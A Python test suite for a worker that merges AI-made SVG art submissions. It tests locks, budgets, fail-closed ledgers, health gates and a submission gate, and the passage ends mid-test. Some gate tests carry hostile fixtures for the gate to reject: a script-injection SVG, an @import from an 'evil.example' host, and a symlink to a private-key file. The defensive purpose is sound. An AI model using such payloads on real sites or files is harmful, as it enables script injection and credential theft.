"""test_evolve_worker.py — the guarantees the art arm is not allowed to lose.

Every test here is a thing that, if it broke silently, would look exactly like
success: a second worker doubling the spend, a corrupt ledger handing back the
day's budget, a model committing its own work, a nine-candidate "cycle", a
timeout that texted a paintbrush. Mocks and temp git repos only — nothing here
touches the live instance, GitHub, or a model.
"""

import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
import unittest
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest import mock

import evolve_worker as EW
import sentinel
import subsentinels as SS

SCRATCH = Path(__file__).resolve().parent / ".tmp-evolve-worker-tests"
# Captured before any test patches it: ArtDeliveryTests puts the REAL notify
# back so it can watch the genuine path reach the genuine queue.
REAL_NOTIFY = sentinel.notify
NOW = datetime(2026, 8, 17, 22, 0, tzinfo=timezone.utc)


def _history_snapshot():
    """What the ledger held at the moment a notification was sent."""
    try:
        return json.loads(EW.HISTORY_PATH.read_text(encoding="utf-8"))
    except Exception:
        return []


def scratch_dir(name):
    SCRATCH.mkdir(exist_ok=True)
    path = SCRATCH / f"{name}-{uuid.uuid4().hex[:8]}"
    path.mkdir(parents=True)
    return path


def git(cwd, *args):
    """Harness git, run in the sanitized environment.

    The hostile-environment tests deliberately poison os.environ; the harness
    that builds and inspects the fixtures must not be poisoned with it, or the
    test measures the harness instead of the controller.
    """
    r = subprocess.run(["git", *args], cwd=str(cwd), capture_output=True,
                       text=True, env=EW.controller_git_env())
    if r.returncode != 0:
        raise AssertionError(f"git {' '.join(args)} failed: {r.stderr}")
    return r.stdout


def git_bare(bare, *args):
    """This machine sets safe.bareRepository=explicit, so say --git-dir."""
    bare = Path(bare)
    return git(bare.parent, f"--git-dir={bare}", *args)


SVG = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
       '<circle cx="5" cy="5" r="4"/></svg>')


def dada_cycle(slug, cycle=1, previous=None, rounds=1,
               candidates=EW.CANDIDATES_PER_ROUND,
               dimensions=EW.SCORE_DIMENSIONS, round1_records=None):
    body = []
    for r in range(1, rounds + 1):
        if r == 1 and round1_records:
            cands = [dict(rec) for rec in round1_records]
        else:
            cands = [{"id": f"r{r}c{i}", "premise": f"premise {r}.{i}",
                      "scores": {d: 5 for d in dimensions}}
                     for i in range(1, candidates + 1)]
        body.append({"round": r, "candidates": cands,
                     "selected": cands[0]["id"] if cands else None})
    return {
        "cycle": cycle,
        "previous_slug": previous,
        "rounds": body,
        "winner": {"round": rounds,
                   "candidate": body[-1]["selected"] if body else None,
                   "slug": slug},
    }


def meta_for(slug, cycle=1, previous=None, round1_records=None, **overrides):
    meta = {
        "schema": EW.SUBMISSION_SCHEMA,
        "title": slug.replace("-", " ").title(),
        "slug": slug,
        "contributor": "kody-w",
        "kind": "svg",
        "submitted_at": "2026-08-17T22:00:00Z",
        "remix_of": None,
        "license": "CC0-1.0",
        "_dada_cycle": dada_cycle(slug, cycle=cycle, previous=previous,
                                  round1_records=round1_records),
    }
    meta.update(overrides)
    return meta


def write_submission(root, slug, meta=None, piece=SVG, piece_name="piece.svg"):
    """Write into the FIXED output directory the controller precreates.

    `root` is a staging `out/` (the maker's world, where the slug lives only
    in meta.json because nothing in its toolset can create a directory), or a
    seed repository, where a slug still names a folder.
    """
    root = Path(root)
    directory = (root / EW.SUBMISSION_DIR if root.name == "out"
                 else root / "submissions" / slug)
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "meta.json").write_text(
        json.dumps(meta if meta is not None else meta_for(slug), indent=2),
        encoding="utf-8")
    (directory / piece_name).write_text(piece, encoding="utf-8")
    return directory


class ScratchCase(unittest.TestCase):
    """A worker whose entire durable footprint lives in a scratch directory."""

    def setUp(self):
        self.home = scratch_dir(self.__class__.__name__)
        self.state = self.home / "state"
        self.logs = self.home / "logs"
        self.state.mkdir()
        self.logs.mkdir()
        patches = {
            "HOME": self.home,
            "STATE": self.state,
            "LOGS": self.logs,
            "STOP": self.home / "STOP",
            "LOCK_PATH": self.state / "evolve-worker.lock",
            "HISTORY_PATH": self.state / "evolve-worker-history.json",
            "TURN_PATH": self.state / "evolve-worker-turn.json",
            "ALERT_PATH": self.state / "evolve-worker-alerts.json",
        }
        for name, value in patches.items():
            p = mock.patch.object(EW, name, value)
            p.start()
            self.addCleanup(p.stop)
        # No test may reach the network: every view-url probe answers 200
        # unless a test says otherwise.
        self.probes = []

        def fake_probe(url, timeout=10):
            self.probes.append(url)
            return (self.probe_answer(url), "HTTP 200")
        self.probe_answer = lambda url: True
        p = mock.patch.object(EW, "probe_url", fake_probe)
        p.start()
        self.addCleanup(p.stop)
        p = mock.patch.object(EW.time, "sleep", lambda *_: None)
        p.start()
        self.addCleanup(p.stop)

        self.notifications = []
        p = mock.patch.object(
            EW.sentinel, "notify",
            side_effect=lambda cfg, text, to=None, rebuild=False:
            self.notifications.append({"text": text, "to": to,
                                       "rebuild": rebuild,
                                       "history": _history_snapshot()}))
        p.start()
        self.addCleanup(p.stop)
        self.frames = []
        p = mock.patch.object(EW.NB, "emit",
                              side_effect=lambda slug, kind, payload:
                              self.frames.append((slug, kind, payload)))
        p.start()
        self.addCleanup(p.stop)

    def texts(self):
        return [n["text"] for n in self.notifications]

    def tearDown(self):
        shutil.rmtree(self.home, ignore_errors=True)


# ── lock ────────────────────────────────────────────────────────────────────

class LockTests(ScratchCase):
    def test_a_second_worker_cannot_take_the_lock(self):
        first = EW.acquire_lock()
        self.addCleanup(EW.release_lock, first)
        self.assertIsNotNone(first)
        self.assertIsNone(EW.acquire_lock(),
                          "a second pass must not run while one is in flight")

    def test_the_lock_is_reusable_once_released(self):
        first = EW.acquire_lock()
        EW.release_lock(first)
        second = EW.acquire_lock()
        self.addCleanup(EW.release_lock, second)
        self.assertIsNotNone(second)

    def test_a_held_lock_skips_the_pass_without_spending(self):
        held = EW.acquire_lock()
        self.addCleanup(EW.release_lock, held)
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=worker_cfg(), health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("lock", summary["reason"])
        model.assert_not_called()


# ── cadence and budget ──────────────────────────────────────────────────────

class CadenceBudgetTests(ScratchCase):
    def rows(self, *ages_h, **extra):
        return [{"at": (NOW - timedelta(hours=h)).isoformat(),
                 "mode": "evolve", **extra} for h in ages_h]

    def test_first_evolution_is_allowed(self):
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ready, why = EW.cadence_ready([], {"interval_hours": 4})
        self.assertTrue(ready)
        self.assertEqual("first evolution", why)

    def test_recent_evolution_waits_for_the_global_cadence(self):
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ready, why = EW.cadence_ready(self.rows(2), {"interval_hours": 4})
        self.assertFalse(ready)
        self.assertIn("2.0h of 4.0h", why)

    def test_cadence_is_global_across_roles(self):
        history = [{"at": (NOW - timedelta(hours=1)).isoformat(),
                    "mode": "evolve", "role": "scout"}]
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ready, _ = EW.cadence_ready(history, {"interval_hours": 4})
        self.assertFalse(ready, "another role's run still consumes the cadence")

    def test_budget_is_a_rolling_24h_window(self):
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ok, used, cap = EW.within_budget(self.rows(1, 5), {"daily_budget": 2})
            self.assertFalse(ok)
            self.assertEqual((2, 2), (used, cap))
            ok, used, _ = EW.within_budget(self.rows(1, 30), {"daily_budget": 2})
        self.assertTrue(ok)
        self.assertEqual(1, used, "a row older than 24h is out of the window")

    def test_skipped_rows_never_consume_the_budget(self):
        history = self.rows(1, 2, 3, skipped=True)
        with mock.patch.object(EW.sentinel, "now", return_value=NOW):
            ok, used, _ = EW.within_budget(history, {"daily_budget": 2})
        self.assertTrue(ok)
        self.assertEqual(0, used)

    def test_a_spent_budget_skips_before_the_model(self):
        EW.save_history([{"at": NOW.isoformat(), "mode": "evolve"}])
        with mock.patch.object(EW.sentinel, "now", return_value=NOW), \
             mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=worker_cfg(daily_evolve_budget=1),
                                  health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("budget spent", summary["reason"])
        model.assert_not_called()


# ── fail-closed ledgers ─────────────────────────────────────────────────────

class CorruptLedgerTests(ScratchCase):
    def test_corrupt_history_raises_instead_of_reading_as_no_spend(self):
        EW.HISTORY_PATH.write_text("{not json", encoding="utf-8")
        with self.assertRaises(EW.LedgerError):
            EW.load_history()

    def test_empty_history_is_unknown_not_zero(self):
        EW.HISTORY_PATH.write_text("   ", encoding="utf-8")
        with self.assertRaises(EW.LedgerError):
            EW.load_history()

    def test_a_row_with_an_unparseable_timestamp_fails_closed(self):
        EW.HISTORY_PATH.write_text(json.dumps([{"at": "yesterday", "mode": "evolve"}]),
                                   encoding="utf-8")
        with self.assertRaises(EW.LedgerError):
            EW.load_history()

    def test_a_missing_history_is_simply_zero_spend(self):
        self.assertEqual([], EW.load_history())

    def test_corrupt_history_stops_the_pass_and_preserves_the_bytes(self):
        raw = '[{"at": "2026-08-17T21:00:00+00:00", "mode": "evolve"'
        EW.HISTORY_PATH.write_text(raw, encoding="utf-8")
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=worker_cfg(), health=lambda phase: healthy())
        self.assertEqual("fail-closed", summary["outcome"])
        model.assert_not_called()
        self.assertEqual(raw, EW.HISTORY_PATH.read_text(encoding="utf-8"),
                         "a corrupt ledger must never be rewritten as empty")
        self.assertTrue(self.notifications, "fail-closed must be said out loud")
        self.assertNotIn(EW.SUCCESS_PREFIX, self.texts()[0])

    def test_corrupt_creative_state_fails_closed_before_the_model(self):
        (self.state / "evolve-creative-state.json").write_text("{;", encoding="utf-8")
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=worker_cfg(), health=lambda phase: healthy())
        self.assertEqual("fail-closed", summary["outcome"])
        model.assert_not_called()

    def test_atomic_write_leaves_no_partial_file_behind(self):
        target = self.state / "ledger.json"
        EW.atomic_write_json(target, [{"at": "now"}])
        self.assertEqual([{"at": "now"}], json.loads(target.read_text()))
        leftovers = [p.name for p in self.state.iterdir() if p.name.startswith(".")]
        self.assertEqual([], leftovers)


# ── health gates ────────────────────────────────────────────────────────────

class HealthGateTests(unittest.TestCase):
    def test_critical_always_aborts(self):
        ok, why = EW.health_gate({"degraded_allowlist": ["rb_workflows"]},
                                 {"status": "critical", "critical": ["rb_workflows"],
                                  "failed": ["rb_workflows"]})
        self.assertFalse(ok)
        self.assertIn("critical", why)

    def test_degraded_needs_every_failing_id_allowlisted(self):
        cfg = {"degraded_allowlist": ["w_openrappter_spin"]}
        ok, why = EW.health_gate(cfg, {"status": "degraded", "critical": [],
                                       "failed": ["w_openrappter_spin"]})
        self.assertTrue(ok)
        ok, why = EW.health_gate(cfg, {"status": "degraded", "critical": [],
                                       "failed": ["w_openrappter_spin", "rb_shards"]})
        self.assertFalse(ok)
        self.assertIn("rb_shards", why)

    def test_evolve_on_degraded_is_not_a_blanket_switch_here(self):
        ok, _ = EW.health_gate({"evolve_on_degraded": True, "degraded_allowlist": []},
                               {"status": "degraded", "critical": [],
                                "failed": ["rb_shards"]})
        self.assertFalse(ok, "the worker must ignore evolve_on_degraded")

    def test_a_blind_health_run_is_not_healthy(self):
        ok, _ = EW.health_gate({"degraded_allowlist": ["w_openrappter_spin"]},
                               {"status": "degraded", "critical": [],
                                "failed": ["health_runtime"]})
        self.assertFalse(ok)

    def test_healthy_passes(self):
        ok, _ = EW.health_gate({}, healthy())
        self.assertTrue(ok)

    def test_alert_delivery_cannot_be_allowlisted(self):
        # Since 232ce7e an unverifiable or dead-lettered send fails this check
        # instead of passing optimistically. Art must not outrun the channel
        # that would report it.
        verdict = {"status": "degraded", "critical": [],
                   "failed": ["alert_delivery"]}
        for allowlist in ([], ["alert_delivery"],
                          ["alert_delivery", "w_openrappter_spin"]):
            with self.subTest(allowlist=allowlist):
                ok, why = EW.health_gate({"degraded_allowlist": allowlist}, verdict)
                self.assertFalse(ok, "unverified/dead-letter alerts block new art")
                self.assertIn("alert_delivery", why)
                self.assertIn("cannot be allowlisted", why)

    def test_a_blind_health_run_cannot_be_allowlisted_either(self):
        ok, why = EW.health_gate({"degraded_allowlist": ["health_runtime"]},
                                 {"status": "degraded", "critical": [],
                                  "failed": ["health_runtime"]})
        self.assertFalse(ok)
        self.assertIn("cannot be allowlisted", why)

    def test_the_unskippable_set_is_exactly_what_it_claims(self):
        self.assertEqual({"alert_delivery", "health_runtime"},
                         set(EW.NEVER_ALLOWLISTABLE))

    def test_alert_delivery_blocks_even_beside_allowlisted_noise(self):
        ok, why = EW.health_gate(
            {"degraded_allowlist": ["w_openrappter_spin", "alert_delivery"]},
            {"status": "degraded", "critical": [],
             "failed": ["w_openrappter_spin", "alert_delivery"]})
        self.assertFalse(ok)
        self.assertIn("alert_delivery", why)


# ── the deterministic gate ──────────────────────────────────────────────────

class GateTests(ScratchCase):
    """The staging gate: a submission tree with no git anywhere near it."""

    def setUp(self):
        super().setUp()
        self.staging = self.home / "staging"
        EW.prepare_staging(self.staging)
        self.out = self.staging / "out"
        self.submission_dir = self.out / EW.SUBMISSION_DIR
        self.wcfg = EW.worker_config({})
        self.known = {"already-here"}

    def gate(self, cycle=2, previous="already-here", round1=None):
        EW.assert_no_git(self.staging)
        return EW.gate_directory(self.out, self.wcfg, cycle, previous, round1,
                                 self.known)

    def submit(self, slug="new-piece", meta=None, **kwargs):
        return write_submission(
            self.out, slug,
            meta if meta is not None else meta_for(slug, cycle=2,
                                                   previous="already-here"),
            **kwargs)

    def test_a_clean_submission_passes(self):
        self.submit()
        result = self.gate()
        self.assertEqual("new-piece", result["slug"])
        self.assertEqual("submissions/new-piece/piece.svg", result["piece_path"])
        self.assertEqual(SVG.encode(), result["piece_bytes"])

    def test_an_empty_output_directory_is_a_decline_shaped_rejection(self):
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("no new submission", str(cm.exception))

    def test_a_second_directory_is_rejected(self):
        self.submit()
        (self.out / "another").mkdir()
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("may not create paths", str(cm.exception))

    def test_a_hidden_probe_file_is_rejected(self):
        # exactly what the live cycle left behind when it could not mkdir
        self.submit()
        (self.submission_dir / ".probe").write_text("", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("hidden file", str(cm.exception))

    def test_the_slug_comes_from_meta_not_a_directory_name(self):
        self.submit(meta=meta_for("named-in-meta", cycle=2,
                                  previous="already-here"))
        result = self.gate()
        self.assertEqual("named-in-meta", result["slug"])
        self.assertEqual("submissions/named-in-meta/meta.json",
                         result["meta_path"])

    def test_a_bad_slug_in_meta_is_rejected(self):
        self.submit(meta=meta_for("Not A Slug", cycle=2,
                                  previous="already-here"))
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("meta.slug", str(cm.exception))

    def test_anything_beside_the_fixed_directory_is_rejected(self):
        self.submit()
        (self.out / "notes.md").write_text("hi", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("may not create paths", str(cm.exception))

    def test_a_third_file_in_the_folder_is_rejected(self):
        directory = self.submit()
        (directory / "notes.txt").write_text("extra", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("meta.json + piece", str(cm.exception))

    def test_a_colliding_slug_is_rejected(self):
        self.submit(meta=meta_for("already-here", cycle=2,
                                  previous="already-here"))
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("already exists", str(cm.exception))

    def test_a_git_directory_in_staging_is_rejected(self):
        self.submit()
        (self.staging / ".git").mkdir()
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn(".git", str(cm.exception))

    def test_a_git_file_inside_the_submission_is_rejected(self):
        directory = self.submit()
        (directory / ".git").write_text("gitdir: /somewhere/else", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn(".git", str(cm.exception))

    def test_extension_must_match_kind(self):
        self.submit(meta=meta_for("new-piece", cycle=2, previous="already-here",
                                  kind="md"), piece_name="piece.svg")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("piece.md", str(cm.exception))

    def test_unknown_license_is_rejected(self):
        self.submit(meta=meta_for("new-piece", cycle=2, previous="already-here",
                                  license="MIT"))
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("license", str(cm.exception))

    def test_wrong_schema_is_rejected(self):
        self.submit(meta=meta_for("new-piece", cycle=2, previous="already-here",
                                  schema="rapp-art-submission/2.0"))
        with self.assertRaises(EW.GateError):
            self.gate()

    def test_unknown_top_level_meta_key_is_rejected(self):
        meta = meta_for("new-piece", cycle=2, previous="already-here")
        meta["price"] = 100
        self.submit(meta=meta)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("unknown keys", str(cm.exception))

    def test_an_unknown_remix_target_is_rejected(self):
        self.submit(meta=meta_for("new-piece", cycle=2, previous="already-here",
                                  remix_of="never-existed"))
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("remix_of", str(cm.exception))

    def test_an_oversized_piece_is_rejected(self):
        big = ('<svg xmlns="http://www.w3.org/2000/svg">'
               + "<!--" + "x" * 60000 + "-->" + "</svg>")
        self.submit(piece=big)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("byte cap", str(cm.exception))

    def test_svg_with_a_script_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<script>alert(1)</script></svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("script", str(cm.exception))

    def test_svg_with_an_event_attribute_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<circle onclick="x()" r="1"/></svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("event attribute", str(cm.exception))

    def test_svg_with_an_external_reference_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<image href="https://example.com/a.png"/></svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("outside itself", str(cm.exception))

    def test_svg_with_an_external_css_reference_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<style>@import url(https://evil.example/x.css);'
                          '</style><circle r="1"/></svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("@import", str(cm.exception))

    def test_svg_with_an_external_fill_url_is_rejected(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<circle r="1" fill="url(https://x.example/a.svg#g)"/>'
                          '</svg>')
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("outside itself", str(cm.exception))

    def test_a_fragment_url_reference_is_allowed(self):
        self.submit(piece='<svg xmlns="http://www.w3.org/2000/svg">'
                          '<circle r="1" fill="url(#grad)"/>'
                          '<use href="#grad"/></svg>')
        self.assertEqual("new-piece", self.gate()["slug"])

    def test_unparseable_svg_is_rejected(self):
        self.submit(piece="<svg><circle></svg>")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("parse", str(cm.exception))

    def test_a_nested_directory_in_the_output_is_rejected(self):
        directory = self.submit()
        (directory / "extra").mkdir()
        (directory / "extra" / "more.svg").write_text(SVG, encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("not a regular file", str(cm.exception))

    def test_a_symlinked_piece_is_rejected(self):
        directory = self.submission_dir
        (directory / "meta.json").write_text(
            json.dumps(meta_for("new-piece", cycle=2, previous="already-here")),
            encoding="utf-8")
        secret = self.home / "id_ed25519"
        secret.write_text("PRIVATE KEY", encoding="utf-8")
        (directory / "piece.svg").symlink_to(secret)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("symlink", str(cm.exception))

    def test_a_symlinked_output_folder_is_rejected(self):
        elsewhere = self.home / "elsewhere"
        elsewhere.mkdir()
        shutil.rmtree(self.submission_dir)
        self.submission_dir.symlink_to(elsewhere)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("symlink", str(cm.exception))

    def test_a_hardlinked_piece_is_rejected(self):
        directory = self.submit()
        os.link(directory / "piece.svg", self.home / "second-name.svg")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("hard link", str(cm.exception))

    def test_an_executable_piece_is_rejected(self):
        directory = self.submit()
        os.chmod(directory / "piece.svg", 0o755)
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("executable", str(cm.exception))

    def test_a_fifo_is_rejected(self):
        directory = self.submission_dir
        (directory / "meta.json").write_text(
            json.dumps(meta_for("new-piece", cycle=2, previous="already-here")),
            encoding="utf-8")
        os.mkfifo(directory / "piece.svg")
        with self.assertRaises(EW.GateError) as cm:
            self.gate()
        self.assertIn("not a regular file", str(cm.exception))


class DadaCycleTests(unittest.TestCase):
    """The 10-candidate invariant and its neighbours, checked directly."""

    def test_a_ten_candidate_round_passes(self):
        EW.validate_dada_cycle(dada_cycle("s", cycle=3, previous="p"),
                               "s", 3, "p")

    def test_nine_candidates_is_a_rejection(self):
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(dada_cycle("s", candidates=9), "s", 1, None)
        self.assertIn("exactly 10", str(cm.exception))

    def test_eleven_candidates_is_a_rejection(self):
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", candidates=11), "s", 1, None)

    def test_one_short_round_among_many_is_caught(self):
        cycle = dada_cycle("s", rounds=3)
        cycle["rounds"][1]["candidates"].pop()
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(cycle, "s", 1, None)
        self.assertIn("round 2", str(cm.exception))

    def test_rounds_must_be_between_one_and_five(self):
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", rounds=6), "s", 1, None)
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", rounds=0), "s", 1, None)
        EW.validate_dada_cycle(dada_cycle("s", rounds=5), "s", 1, None)

    def test_exactly_six_named_score_dimensions(self):
        five = EW.SCORE_DIMENSIONS[:5]
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(dada_cycle("s", dimensions=five), "s", 1, None)
        self.assertIn("scores", str(cm.exception))
        seven = EW.SCORE_DIMENSIONS + ("vibes",)
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", dimensions=seven), "s", 1, None)

    def test_scores_must_be_numbers_in_range(self):
        cycle = dada_cycle("s")
        cycle["rounds"][0]["candidates"][3]["scores"]["craft"] = "high"
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(cycle, "s", 1, None)
        cycle = dada_cycle("s")
        cycle["rounds"][0]["candidates"][3]["scores"]["craft"] = 99
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(cycle, "s", 1, None)

    def test_duplicate_candidate_ids_are_rejected(self):
        cycle = dada_cycle("s")
        cycle["rounds"][0]["candidates"][2]["id"] = "r1c1"
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(cycle, "s", 1, None)
        self.assertIn("repeats", str(cm.exception))

    def test_the_winner_must_be_the_final_round_selection(self):
        cycle = dada_cycle("s", rounds=2)
        cycle["winner"]["candidate"] = "r2c9"
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(cycle, "s", 1, None)
        self.assertIn("final round selected", str(cm.exception))

    def test_the_winner_must_name_the_submission(self):
        cycle = dada_cycle("s")
        cycle["winner"]["slug"] = "some-other-thing"
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(cycle, "s", 1, None)

    def test_cycle_continuity_is_enforced_in_both_directions(self):
        with self.assertRaises(EW.GateError) as cm:
            EW.validate_dada_cycle(dada_cycle("s", cycle=1, previous=None),
                                   "s", 4, "prior-slug")
        self.assertIn("continuity", str(cm.exception))
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(dada_cycle("s", cycle=4, previous="wrong"),
                                   "s", 4, "prior-slug")
        EW.validate_dada_cycle(dada_cycle("s", cycle=4, previous="prior-slug"),
                               "s", 4, "prior-slug")

    def test_a_missing_cycle_block_is_a_rejection(self):
        with self.assertRaises(EW.GateError):
            EW.validate_dada_cycle(None, "s", 1, None)


# ── end to end, against temp repos ──────────────────────────────────────────

def healthy():
    return {"status": "healthy", "failed": [], "critical": [],
            "checks": [], "summary": "all good"}


def critical(*ids):
    return {"status": "critical", "failed": list(ids), "critical": list(ids),
            "checks": [], "summary": "on fire"}


def worker_cfg(**overrides):
    cfg = {
        "level": 3,
        "instance_name": "Dada Collective",
        "copilot_model": "test-model",
        "evolve_timeout_s": 60,
        "daily_evolve_budget": 10,
        "evolve_interval_hours": 0,
        "notify": True,
        "notify_handle": "+15550000001",
        "report_number": "+15550000002",
        "commons_repo": "kody-w/public-art-collective",
        "creative_state_file": "state/evolve-creative-state.json",
        "evolve_worker": {"enabled": True, "degraded_allowlist": ["w_openrappter_spin"]},
    }
    worker_block = overrides.pop("evolve_worker", None)
    cfg.update(overrides)
    if worker_block:
        cfg["evolve_worker"] = {**cfg["evolve_worker"], **worker_block}
    return cfg


class FakeGh:
    """Just enough GitHub to prove the controller believes only evidence.

    `pr view` answers from the bare origin repo, not from what the controller
    thinks it pushed, and `pr merge` really moves origin/main — so the
    post-merge re-read in publish() is exercised for real.
    """

    def __init__(self, origin, base="main"):
        self.origin = Path(origin)
        self.base = base
        self.calls = []
        self.extra_file = None      # to fake a PR that touches more than it should
        self.merged = False

    def __call__(self, *args, timeout=None):
        self.calls.append(args)
        if args[:2] == ("pr", "create"):
            self.branch = args[args.index("--head") + 1]
            return "https://github.com/kody-w/public-art-collective/pull/7\n"
        if args[:2] == ("pr", "view") and "files" in args[-1]:
            names = [line.split("\t") for line in git_bare(
                self.origin, "diff", "--name-status",
                f"{self.base}..{self.branch}").splitlines() if line.strip()]
            files = [{"path": path, "additions": 1, "deletions": 0}
                     for _, path in names]
            if self.extra_file:
                files.append({"path": self.extra_file, "additions": 1,
                              "deletions": 2})
            return json.dumps({"files": files, "state": "OPEN",
                               "baseRefName": self.base,
                               "headRefName": self.branch,
                               "isCrossRepository": False})
        if args[:2] == ("pr", "merge"):
            sha = git_bare(self.origin, "rev-parse", self.branch).strip()
            git_bare(self.origin, "update-ref", f"refs/heads/{self.base}", sha)
            self.merge_sha = sha
            self.merged = True
            return ""
        if args[:2] == ("pr", "view"):
            return json.dumps({"state": "MERGED" if self.merged else "OPEN",
                               "merged": self.merged,
                               "mergeCommit": {"oid": getattr(self, "merge_sha", "")}})
        if args[:2] == ("pr", "close"):
            return ""
        raise AssertionError(f"unexpected gh call: {args}")

    def called(self, *prefix):
        return any(call[:len(prefix)] == prefix for call in self.calls)


class WorkerEnv(ScratchCase):
    """A worker pointed at a temp origin repo with a scripted GitHub."""

    def setUp(self):
        super().setUp()
        self.origin = self.home / "origin.git"
        seed = self.home / "seed"
        seed.mkdir()
        git(seed, "init", "-b", "main")
        git(seed, "config", "user.email", "t@example.com")
        git(seed, "config", "user.name", "t")
        write_submission(seed, "already-here")
        (seed / "submissions" / "index.json").write_text('{"submissions": []}',
                                                         encoding="utf-8")
        git(seed, "add", "-A")
        git(seed, "commit", "-m", "seed")
        git(self.home, "init", "--bare", "-b", "main", str(self.origin))
        git(seed, "remote", "add", "origin", str(self.origin))
        git(seed, "push", "-u", "origin", "main")
        self.gh = FakeGh(self.origin)
        for name, value in (("_gh", self.gh),):
            p = mock.patch.object(EW, name, value)
            p.start()
            self.addCleanup(p.stop)
        for name, value in (("identities", lambda: {s: f"rappid:test:{s}"
                                                    for s in EW.NB.NEIGHBORS}),
                            ("roll_call", lambda: {s: {"alive": True}
                                                   for s in EW.NB.NEIGHBORS}),
                            ("chain_path", lambda slug: self.home / f"{slug}.jsonl")):
            p = mock.patch.object(EW.NB, name, value)
            p.start()
            self.addCleanup(p.stop)
        self.cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "git_author_name": "test",
            "git_author_email": "t@example.com",
        })

    def model_that_submits(self, slug="new-piece", cycle=1, previous=None,
                           result="CONTRIBUTED it made a thing"):
        def fake(staging, prompt, wcfg, depth=0, runtime=None):
            self.prompt = prompt
            staging = Path(staging)
            write_submission(staging / "out", slug,
                             meta_for(slug, cycle=cycle, previous=previous))
            (staging / "state-out.json").write_text(json.dumps({
                "cycle": cycle, "last_slug": slug, "notes": "learned things",
            }), encoding="utf-8")
            return "ok", f"working...\nSENTINEL_RESULT: {result}\n"
        return fake

    def workspaces(self):
        root = self.home / "state" / "evolve-workspaces"
        return sorted(p.name for p in root.iterdir()) if root.exists() else []


class WorkerRunTests(WorkerEnv):
    # ── the verified success path ──
    def test_a_verified_merge_updates_every_ledger_exactly_once(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertTrue(self.gh.merged)

        # the piece really is on the base branch now
        listed = git_bare(self.origin, "ls-tree", "--name-only", "-r", "main")
        self.assertIn("submissions/new-piece/piece.svg", listed)

        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(1, len(history))
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, history[0]["outcome"])
        self.assertEqual(summary["receipts"]["merge_commit"],
                         history[0]["merge_commit"])

        state = json.loads((self.state / "evolve-creative-state.json").read_text())
